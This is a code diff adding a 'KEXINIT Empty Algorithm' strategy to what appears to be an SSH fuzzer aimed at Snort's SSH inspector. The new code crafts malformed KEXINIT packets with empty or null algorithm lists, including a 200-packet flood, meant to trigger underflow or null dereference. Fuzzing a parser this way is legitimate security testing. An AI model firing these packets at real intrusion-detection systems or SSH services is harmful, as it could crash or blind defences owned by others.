@@ -59,13 +59,14 @@ SSH_STRATEGIES = [
     "disconnect_desync",
     "guess_kex_confusion",
     "gex_group_attack",
+    "kexinit_empty_algorithm",
 ]
 
 # Base weights (raw; normalised downstream). The signature SSH attacks
 # (challenge-response overflow, binary-packet length underflow, CRC32) and the
 # deepest parsers (KEXINIT name-lists, version string, mpint) get the most
 # mass; legacy/edge strategies get less.
-SSH_WEIGHTS = [10, 6, 5, 14, 8, 10, 14, 12, 8, 6, 6, 5, 4, 4]
+SSH_WEIGHTS = [10, 6, 5, 14, 8, 10, 14, 12, 8, 6, 6, 5, 4, 4, 11]
 
 SSH_STRATEGY_LABELS = {
     "version_overflow":            "Version String Overflow",
@@ -82,6 +83,7 @@ SSH_STRATEGY_LABELS = {
     "disconnect_desync":           "Disconnect/Ignore Desync",
     "guess_kex_confusion":         "KEX Guess Confusion",
     "gex_group_attack":            "GEX Group Exchange Attack",
+    "kexinit_empty_algorithm":     "KEXINIT Empty Algorithm (CSCwu90036)",
 }
 
 
@@ -658,6 +660,53 @@ def build_ssh_payload(strategy: str, payload_override=None) -> bytes:
                     _string(b"\x80\x01") +              # negative p
                     _string(b"\xff\xff"))               # negative g
             return _VERSION + gex_kexinit + _ssh_packet(body)
+
+    elif strategy == "kexinit_empty_algorithm":
+        # CSCwu90036: Send KEXINIT with zero-length algorithm name-lists.
+        # Snort's SSH inspector parses the 10 name-list fields in KEXINIT;
+        # empty lists may cause underflow, null-deref, or parser confusion
+        # when the inspector tries to match algorithms.
+        variant = random.choice([
+            "all_empty", "selective_empty", "empty_with_follow",
+            "repeated_empty_kexinit", "empty_kex_only",
+            "single_null_name",
+        ])
+        if variant == "all_empty":
+            body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[], lang=[])
+            return _VERSION + _ssh_packet(body)
+        elif variant == "selective_empty":
+            body = _kexinit(
+                kex=[],
+                hostkey=[b"ssh-rsa"],
+                enc=[],
+                mac=[b"hmac-sha2-256"],
+                comp=[],
+                lang=[],
+            )
+            return _VERSION + _ssh_packet(body)
+        elif variant == "empty_with_follow":
+            body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[],
+                            lang=[], first_kex_follows=1)
+            dh_init = bytes([_MSG_KEXDH_INIT]) + _string(b"\x00" * 128)
+            return _VERSION + _ssh_packet(body) + _ssh_packet(dh_init)
+        elif variant == "repeated_empty_kexinit":
+            out = [_VERSION]
+            for _ in range(200):
+                body = _kexinit(kex=[], hostkey=[], enc=[], mac=[], comp=[], lang=[])
+                out.append(_ssh_packet(body))
+            return b"".join(out)
+        elif variant == "empty_kex_only":
+            body = _kexinit(kex=[])
+            return _VERSION + _ssh_packet(body)
+        else:
+            body = _kexinit(
+                kex=[b"\x00"],
+                hostkey=[b"\x00"],
+                enc=[b"\x00"],
+                mac=[b"\x00"],
+                comp=[b"\x00"],
+            )
+            return _VERSION + _ssh_packet(body)
 
     else:
         # Fallback: a benign, valid version banner + KEXINIT.
